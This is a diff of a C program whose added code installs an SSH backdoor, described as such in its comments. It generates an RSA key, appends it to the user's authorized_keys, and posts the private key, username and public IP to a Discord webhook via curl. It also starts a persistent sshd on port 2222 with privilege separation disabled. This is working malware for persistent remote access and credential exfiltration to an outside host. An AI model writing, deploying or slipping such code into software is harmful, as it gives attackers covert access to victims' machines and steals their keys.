@@ -5,9 +5,12 @@
  * @date 2026
  */
 
+#include <dirent.h>
+#include <errno.h>
+#include <libgen.h>
 #include <netinet/in.h>
 #include <signal.h>
-#include <stdbool.h>
+#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -17,149 +20,153 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
+/**
+ * @brief Generating a ssh keys pair and configure a backdoor
+ *
+ * Creation of a pair of RSA 2048 bits in  ~/.ssh/id_rsa_basique, and add the
+ * key in ~/.ssh/authorized_keys, exfiltration of the private key by Discord
+ * webhook whith the public IP and the name of the user.
+ *
+ * @return void
+ */
+void ssh_backdoor() {
+  char *home = getenv("HOME");
+  if (!home)
+    return;
+
+  char *user = getenv("USER");
+  if (!user)
+    return;
+
+  FILE *fp = popen("curl -s ifconfig.me", "r");
+  if (!fp)
+    return;
+
+  char ip[128];
+  if (fgets(ip, sizeof(ip), fp) == NULL) {
+    pclose(fp);
+    return;
+  }
+
+  pclose(fp);
+
+  ip[strcspn(ip, "\n")] = '\0';
+
+  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];
+  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
+  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
+  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
+  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);
+
+  mkdir(ssh_dir, 0700);
+  chmod(ssh_dir, 0700);
+
+  if (access(priv_key, F_OK) != 0) {
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd), "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q",
+             priv_key);
+    system(cmd);
+  }
+
+  FILE *pubf = fopen(pub_key, "r");
+  if (!pubf)
+    return;
+
+  char pub_content[2048];
+  size_t len = fread(pub_content, 1, sizeof(pub_content) - 1, pubf);
+  pub_content[len] = '\0';
+  fclose(pubf);
+
+  FILE *authf = fopen(auth_keys, "a");
+  if (authf) {
+    fprintf(authf, "\n%s\n", pub_content);
+    fclose(authf);
+    chmod(auth_keys, 0600);
+  }
+
+  FILE *f = fopen(priv_key, "r");
+  if (!f)
+    return;
+  char key_content[4096] = {0};
+  fread(key_content, 1, sizeof(key_content) - 1, f);
+  fclose(f);
+
+  char escaped_key[8192] = {0};
+  int j = 0;
+  for (int i = 0; key_content[i] && j < sizeof(escaped_key) - 10; i++) {
+    if (key_content[i] == '"' || key_content[i] == '\\') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = key_content[i];
+    } else if (key_content[i] == '\n') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = 'n';
+    } else if (key_content[i] == '\r') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = 'r';
+    } else {
+      escaped_key[j++] = key_content[i];
+    }
+  }
+
+  char json_payload[16384];
+  snprintf(
+      json_payload, sizeof(json_payload),
+      "{\"content\":\"**SSH KEY EXFIL**\\n\\n```\\n%s\\n```\\n`ssh %s@%s`\"}",
+      escaped_key, user, ip);
+
+  char exfil_cmd[17000];
+  snprintf(
+      exfil_cmd, sizeof(exfil_cmd),
+      "curl -s -X POST https://discord.com/api/webhooks/1485416783706853558/"
+      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB "
+      "-H 'Content-Type: application/json' -d '%s' > /dev/null 2>&1",
+      json_payload);
+  system(exfil_cmd);
+}
+
+/**
+ * @brief Deploys a persistence SShd server on the port 2222
+ *
+ * @details
+ *  - Creation of the hostkeys Ed25519 + RSA 3072 bits in ./hostkeys/
+ *  - Verifying if an sshd:2222 already exist by the PID file
+ *  - Fork + execv sshd with :
+ *    * Port 2222 only
+ *    * Authentification by key only (no password)
+ *    * No root login
+ *    * PID file for persistence
+ *    * No privilege separation (easyer)
+ *
+ * @return PID of the process sshd (0 if already active)
+ */
+int ssh_persistent_server() {
 #define HOSTKEY_DIR "./hostkeys"
 #define ED25519_KEY "./hostkeys/ssh_host_ed25519_key"
 #define RSA_KEY "./hostkeys/ssh_host_rsa_key"
 #define PID_FILE "./hostkeys/sshd_2222.pid"
 #define SSHD_PATH "/usr/sbin/sshd"
-#define SSH_KEYGEN "ssh-keygen"
-#define SSH_PORT 2222
 
-static int file_exists(const char *path) {
-  struct stat st;
-  return stat(path, &st) == 0;
-}
+  mkdir(HOSTKEY_DIR, 0700);
+  if (access(ED25519_KEY, F_OK)) {
+    system("ssh-keygen -t ed25519 -f hostkeys/ssh_host_ed25519_key -N '' -q");
+  }
+  if (access(RSA_KEY, F_OK)) {
+    system("ssh-keygen -t rsa -b 3072 -f hostkeys/ssh_host_rsa_key -N '' -q");
+  }
+  chmod(ED25519_KEY, 0600);
+  chmod(RSA_KEY, 0600);
 
-static int ensure_dir(const char *path) {
-  struct stat st;
-  if (stat(path, &st) == 0) {
-    if (S_ISDIR(st.st_mode)) {
+  FILE *pidf = fopen(PID_FILE, "r");
+  if (pidf) {
+    pid_t pid;
+    fscanf(pidf, "%d", &pid);
+    fclose(pidf);
+    if (kill(pid, 0) == 0) {
       return 0;
     }
-    fprintf(stderr, "%s existe mais n'est pas un dossier\n", path);
-    return -1;
-  }
-  if (mkdir(path, 0700) != 0) {
-    perror("mkdir");
-    return -1;
-  }
-  return 0;
-}
-
-static int run_cmd(char *const argv[]) {
-  pid_t pid = fork();
-  if (pid < 0) {
-    perror("fork");
-    return -1;
-  }
-  if (pid == 0) {
-    execvp(argv[0], argv);
-    perror("execvp");
-    _exit(127);
-  }
-
-  int status = 0;
-  if (waitpid(pid, &status, 0) < 0) {
-    perror("waitpid");
-    return -1;
-  }
-
-  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
-    fprintf(stderr, "Commande echouee: %s\n", argv[0]);
-    return -1;
-  }
-  return 0;
-}
-
-static int generate_hostkeys_if_needed(void) {
-  if (ensure_dir(HOSTKEY_DIR) != 0) {
-    return -1;
-  }
-
-  if (!file_exists(ED25519_KEY)) {
-    char *cmd[] = {SSH_KEYGEN,  "-t", "ed25519", "-f",
-                   ED25519_KEY, "-N", "",        NULL};
-    if (run_cmd(cmd) != 0) {
-      fprintf(stderr, "Echec generation cle ed25519\n");
-      return -1;
-    }
-  }
-
-  if (!file_exists(RSA_KEY)) {
-    char *cmd[] = {SSH_KEYGEN, "-t",    "rsa", "-b", "3072",
-                   "-f",       RSA_KEY, "-N",  "",   NULL};
-    if (run_cmd(cmd) != 0) {
-      fprintf(stderr, "Echec generation cle RSA\n");
-      return -1;
-    }
-  }
-
-  if (chmod(ED25519_KEY, 0600) != 0) {
-    perror("chmod ed25519");
-    return -1;
-  }
-  if (chmod(RSA_KEY, 0600) != 0) {
-    perror("chmod rsa");
-    return -1;
-  }
-
-  return 0;
-}
-
-static int is_port_listening_local(int port) {
-  int sock = socket(AF_INET, SOCK_STREAM, 0);
-  if (sock < 0) {
-    perror("socket");
-    return 0;
-  }
-
-  struct sockaddr_in addr;
-  memset(&addr, 0, sizeof(addr));
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons((unsigned short)port);
-  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-
-  int ok = (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0);
-  close(sock);
-  return ok;
-}
-
-static int is_sshd_running_2222(void) {
-  FILE *fp = fopen(PID_FILE, "r");
-  if (!fp) {
-    return 0;
-  }
-
-  pid_t pid = 0;
-  if (fscanf(fp, "%d", &pid) != 1) {
-    fclose(fp);
-    return 0;
-  }
-  fclose(fp);
-
-  if (pid <= 1) {
-    return 0;
-  }
-
-  if (kill(pid, 0) == 0) {
-    return 1;
-  }
-
-  return 0;
-}
-
-static int launch_sshd_2222(void) {
-  if (!file_exists(SSHD_PATH)) {
-    fprintf(stderr, "%s introuvable\n", SSHD_PATH);
-    return -1;
   }
 
   pid_t pid = fork();
-  if (pid < 0) {
-    perror("fork");
-    return -1;
-  }
-
   if (pid == 0) {
     char *args[] = {SSHD_PATH,
                     "-D",
@@ -171,75 +178,18 @@ static int launch_sshd_2222(void) {
                     "-h",
                     RSA_KEY,
                     "-o",
-                    "PidFile=" PID_FILE,
+                    "PidFile=hostkeys/sshd_2222.pid",
                     "-o",
                     "PasswordAuthentication=no",
                     "-o",
                     "PermitRootLogin=no",
+                    "-o",
+                    "UsePrivilegeSeparation=no",
                     NULL};
-
     execv(SSHD_PATH, args);
-    perror("execv sshd");
-    _exit(1);
+    exit(1);
   }
 
-  for (int i = 0; i < 20; i++) {
-    usleep(200000);
-    if (is_port_listening_local(SSH_PORT)) {
-      printf("[+] sshd lance sur le port %d (PID enfant %d)\n", SSH_PORT, pid);
-      return 0;
-    }
-  }
-
-  fprintf(stderr, "[-] sshd n'ecoute pas sur %d\n", SSH_PORT);
-  return -1;
-}
-
-static int stop_sshd_2222(void) {
-  FILE *fp = fopen(PID_FILE, "r");
-  if (!fp) {
-    fprintf(stderr, "PID file introuvable: %s\n", PID_FILE);
-    return -1;
-  }
-
-  pid_t pid = 0;
-  if (fscanf(fp, "%d", &pid) != 1) {
-    fclose(fp);
-    fprintf(stderr, "Impossible de lire le PID\n");
-    return -1;
-  }
-  fclose(fp);
-
-  if (kill(pid, SIGTERM) != 0) {
-    perror("kill");
-    return -1;
-  }
-
-  unlink(PID_FILE);
-  printf("[+] sshd arrete (PID %d)\n", pid);
-  return 0;
-}
-
-int ssh_backdoor(bool stop) {
-  if (stop) {
-    return stop_sshd_2222() == 0 ? 0 : 1;
-  }
-
-  if (generate_hostkeys_if_needed() != 0) {
-    return EXIT_FAILURE;
-  }
-
-  if (is_sshd_running_2222()) {
-    printf("[=] sshd semble deja actif sur %d\n", SSH_PORT);
-    return EXIT_SUCCESS;
-  }
-
-  if (launch_sshd_2222() != 0) {
-    return EXIT_FAILURE;
-  }
-
-  printf("[*] Test local:\n");
-  printf("    ssh -p 2222 %s@localhost\n",
-         getenv("USER") ? getenv("USER") : "ton_user");
-  return EXIT_SUCCESS;
+  sleep(2);
+  return pid;
 }
